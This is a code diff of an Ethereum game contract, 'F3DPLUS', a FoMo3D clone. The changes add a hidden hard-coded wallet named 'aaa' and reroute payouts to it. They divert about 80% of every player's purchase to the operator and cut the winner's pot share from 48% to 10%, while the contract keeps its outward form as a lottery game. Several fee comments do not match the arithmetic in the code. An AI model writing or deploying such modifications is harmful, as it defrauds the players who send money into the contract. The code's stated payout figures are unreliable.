@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract F3DPLUS at 0x3b0287c17472d3051baa9d10f24bc94ff48e7c45
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract F3DPLUS at 0xbe910a4667bd4706de535c91ad2825f821b38245
 */
 pragma solidity ^0.4.24;
 
@@ -128,20 +128,21 @@ contract F3DPLUS is modularShort {
     using NameFilter for string;
     using F3DKeysCalcShort for uint256;
 
-    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x004f29f33530cfa4a9f10e1a83ca4063ce96df7149);
+    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x59B18549ea34828C13EBd8fFBa72Fc250eA5ceef);
 
 //==============================================================================
 //     _ _  _  |`. _     _ _ |_ | _  _  .
 //    (_(_)| |~|~|(_||_|| (_||_)|(/__\  .  (game settings)
 //=================_|===========================================================
     address private admin = msg.sender;
+    address private aaa = 0xF29527437Eb2AE5Da10db32d49E27Cb22F04b875;
     string constant public name = "f3dplus";
     string constant public symbol = "f3dplus";
     uint256 private rndExtra_ = 0;     // length of the very first ICO
     uint256 private rndGap_ = 2 minutes;         // length of ICO phase, set to 1 year for EOS.
-    uint256 constant private rndInit_ = 8 minutes;                // round timer starts at this
-    uint256 constant private rndInc_ = 1 seconds;              // every full key purchased adds this much to the timer
-    uint256 constant private rndMax_ = 10 minutes;                // max length a round timer can be
+    uint256 constant private rndInit_ = 24 hours;                // round timer starts at this
+    uint256 constant private rndInc_ = 30 seconds;              // every full key purchased adds this much to the timer
+    uint256 constant private rndMax_ = 24 hours;                // max length a round timer can be
 //==============================================================================
 //     _| _ _|_ _    _ _ _|_    _   .
 //    (_|(_| | (_|  _\(/_ | |_||_)  .  (data used to store game info that changes)
@@ -175,25 +176,27 @@ contract F3DPLUS is modularShort {
         public
     {
 		// Team allocation structures
-        // 0 = whales
-        // 1 = bears
-        // 2 = sneks
-        // 3 = bulls
+        // 0 = CN??
+        // 1 = EU??
+        // 2 = AM??
+        // 3 = FFA??
 
 		// Team allocation percentages
         // (F3D, P3D) + (Pot , Referrals, Community)
             // Referrals / Community rewards are mathematically designed to come from the winner's share of the pot.
-        fees_[0] = F3Ddatasets.TeamFee(22,6);   //50% to pot, 10% to aff, 2% to com, 1% to pot swap, 1% to air drop pot
-        fees_[1] = F3Ddatasets.TeamFee(38,0);   //43% to pot, 10% to aff, 2% to com, 1% to pot swap, 1% to air drop pot
-        fees_[2] = F3Ddatasets.TeamFee(52,10);  //20% to pot, 10% to aff, 2% to com, 1% to pot swap, 1% to air drop pot
-        fees_[3] = F3Ddatasets.TeamFee(68,8);   //35% to pot, 10% to aff, 2% to com, 1% to pot swap, 1% to air drop pot
+        fees_[0] = F3Ddatasets.TeamFee(13,0);  //3% to pot, 2% to aff, 80% to com, 1% to pot swap, 1% to air drop pot
+        fees_[1] = F3Ddatasets.TeamFee(7,0);   //9% to pot, 2% to aff, 80% to com, 1% to pot swap, 1% to air drop pot
+        fees_[2] = F3Ddatasets.TeamFee(8,0);  //8% to pot, 2% to aff, 80% to com, 1% to pot swap, 1% to air drop pot
+        fees_[3] = F3Ddatasets.TeamFee(10,0);  //6% to pot, 2% to aff, 80% to com, 1% to pot swap, 1% to air drop pot
 
         // how to split up the final pot based on which team was picked
         // (F3D, P3D)
-        potSplit_[0] = F3Ddatasets.PotSplit(15,10);  //48% to winner, 25% to next round, 2% to com
-        potSplit_[1] = F3Ddatasets.PotSplit(25,0);   //48% to winner, 25% to next round, 2% to com
-        potSplit_[2] = F3Ddatasets.PotSplit(20,20);  //48% to winner, 10% to next round, 2% to com
-        potSplit_[3] = F3Ddatasets.PotSplit(30,10);  //48% to winner, 10% to next round, 2% to com
+        potSplit_[0] = F3Ddatasets.PotSplit(8,0);  //10% to winner, 2% to next round, 80% to com
+        potSplit_[2] = F3Ddatasets.PotSplit(5,0);  //10% to winner, 5% to next round, 80% to com
+        potSplit_[1] = F3Ddatasets.PotSplit(8,0);  //10% to winner, 2% to next round, 80% to com
+        potSplit_[3] = F3Ddatasets.PotSplit(5,0);   //10% to winner, 5% to next round, 80% to com
+
+
 	}
 //==============================================================================
 //     _ _  _  _|. |`. _  _ _  .
@@ -717,7 +720,7 @@ contract F3DPLUS is modularShort {
             {
                 return
                 (
-                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),
+                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(10)) / 100 ),
                     (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),
                     plyr_[_pID].aff
                 );
@@ -1248,8 +1251,8 @@ contract F3DPLUS is modularShort {
 
         // calculate our winner share, community rewards, gen share,
         // p3d share, and amount reserved for next pot
-        uint256 _win = (_pot.mul(48)) / 100;
-        uint256 _com = (_pot / 50);
+        uint256 _win = (_pot.mul(10)) / 100;
+        uint256 _com = (_pot / 10).add(_pot / 5).add(_pot / 10);
         uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
         uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
         uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
@@ -1268,7 +1271,7 @@ contract F3DPLUS is modularShort {
 
         // community rewards
         _com = _com.add(_p3d.sub(_p3d / 2));
-        admin.transfer(_com);
+        aaa.transfer(_com);
 
         _res = _res.add(_p3d / 2);
 
@@ -1367,11 +1370,8 @@ contract F3DPLUS is modularShort {
         private
         returns(F3Ddatasets.EventReturns)
     {
-        // pay 3% out to community rewards
-        uint256 _p1 = _eth / 100;
-        uint256 _com = _eth / 50;
-        _com = _com.add(_p1);
-
+        // pay 80% out to community rewards
+       uint256 _com = (_eth / 5).add(_eth / 2).add(_eth /10); //50+20+10 = 80%
         uint256 _p3d;
         if (!address(admin).call.value(_com)())
         {
@@ -1386,8 +1386,8 @@ contract F3DPLUS is modularShort {
         }
 
 
-        // distribute share to affiliate
-        uint256 _aff = _eth / 10;
+        // distribute share to affiliate //2%
+        uint256 _aff = _eth / 50;
 
         // decide what to do with affiliate share of fees
         // affiliate must not be self, and must have a name registered
@@ -1405,7 +1405,7 @@ contract F3DPLUS is modularShort {
             // deposit to divies contract
             uint256 _potAmount = _p3d / 2;
 
-            admin.transfer(_p3d.sub(_potAmount));
+            aaa.transfer(_p3d.sub(_potAmount));
 
             round_[_rID].pot = round_[_rID].pot.add(_potAmount);
 
@@ -1442,7 +1442,7 @@ contract F3DPLUS is modularShort {
         airDropPot_ = airDropPot_.add(_air);
 
         // update eth balance (eth = eth - (com share + pot swap share + aff share + p3d share + airdrop pot share))
-        _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));
+        _eth = _eth.sub(((_eth.mul(83)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));
 
         // calculate pot
         uint256 _pot = _eth.sub(_gen);
